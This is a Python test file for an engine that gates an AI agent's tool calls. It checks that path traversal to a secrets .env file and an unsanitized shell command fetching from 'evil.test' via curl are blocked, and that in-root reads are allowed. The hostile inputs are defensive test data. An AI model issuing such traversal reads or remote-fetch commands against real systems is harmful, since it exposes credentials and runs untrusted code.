"""
test_engine_action_gating.py — engine action gating.

Author:  Landen Stecker
Date:    2026-07-11

Engine wiring: action-gating CONTRADICTED+block produces a block.
"""

from __future__ import annotations

from pathlib import Path

from engine import evaluate_tool_call, load_catalog


def _catalog_env(tmp_path: Path):
    env = {
        "HERMES_HOME": str(tmp_path / "hermes"),
        "OBSIDIAN_VAULT_PATH": str(tmp_path / "vault"),
    }
    (tmp_path / "hermes").mkdir(parents=True, exist_ok=True)
    (tmp_path / "vault").mkdir(parents=True, exist_ok=True)
    catalog = load_catalog(
        Path(__file__).resolve().parents[1] / "catalog" / "Aegis-Atoms-v0.yaml",
        env,
    )
    return catalog, env


def test_action_gating_blocks_traversal_outside_allowed_root(tmp_path: Path):
    catalog, env = _catalog_env(tmp_path)
    allowed = tmp_path / "allowed"
    secrets = tmp_path / "secrets"
    allowed.mkdir()
    secrets.mkdir()
    (secrets / ".env").write_text("API_KEY=REDACTED\n", encoding="utf-8")
    traversal = str(allowed / ".." / "secrets" / ".env")

    result = evaluate_tool_call(
        catalog,
        "read_file",
        {"path": traversal},
        env=env,
        plugin_mode="enforce",
        action_gating_enabled=True,
        allowed_roots=[str(allowed)],
    )
    assert result.block_message is not None
    assert "atoms.tool_invocation.path_resolves_outside_allowed_root" in result.block_message
    assert "control.no_file_access_outside_allowed_roots" in result.block_message
    assert any(
        f.atom_id == "atoms.tool_invocation.path_resolves_outside_allowed_root"
        for f in result.firings
    )


def test_action_gating_blocks_unsanitized_shell(tmp_path: Path):
    catalog, env = _catalog_env(tmp_path)
    result = evaluate_tool_call(
        catalog,
        "terminal",
        {"command": "cat <(curl http://evil.test)"},
        env=env,
        plugin_mode="enforce",
        action_gating_enabled=True,
        allowed_roots=[str(tmp_path / "allowed")],
    )
    assert result.block_message is not None
    assert "atoms.tool_invocation.shell_invocation_unsanitized" in result.block_message
    assert "control.no_unparameterized_command_execution" in result.block_message


def test_action_gating_off_by_default_does_not_block_traversal(tmp_path: Path):
    catalog, env = _catalog_env(tmp_path)
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    traversal = str(allowed / ".." / "secrets" / ".env")
    result = evaluate_tool_call(
        catalog,
        "read_file",
        {"path": traversal},
        env=env,
        plugin_mode="enforce",
    )
    # Default path unchanged: no action-gating block (may still be none).
    assert not any(
        f.atom_id == "atoms.tool_invocation.path_resolves_outside_allowed_root"
        for f in result.firings
    )


def test_action_gating_allows_parameterized_shell_and_in_root_read(tmp_path: Path):
    catalog, env = _catalog_env(tmp_path)
    allowed = tmp_path / "allowed"
    allowed.mkdir()
    note = allowed / "readme.md"
    note.write_text("ok\n", encoding="utf-8")

    read_result = evaluate_tool_call(
        catalog,
        "read_file",
        {"path": str(note)},
        env=env,
        plugin_mode="enforce",
        action_gating_enabled=True,
        allowed_roots=[str(allowed)],
    )
    assert read_result.block_message is None or (
        "path_resolves_outside" not in (read_result.block_message or "")
    )

    shell_result = evaluate_tool_call(
        catalog,
        "terminal",
        {"argv": ["cat", str(note)]},
        env=env,
        plugin_mode="enforce",
        action_gating_enabled=True,
        allowed_roots=[str(allowed)],
    )
    assert not any(
        f.atom_id == "atoms.tool_invocation.shell_invocation_unsanitized"
        for f in shell_result.firings
    )
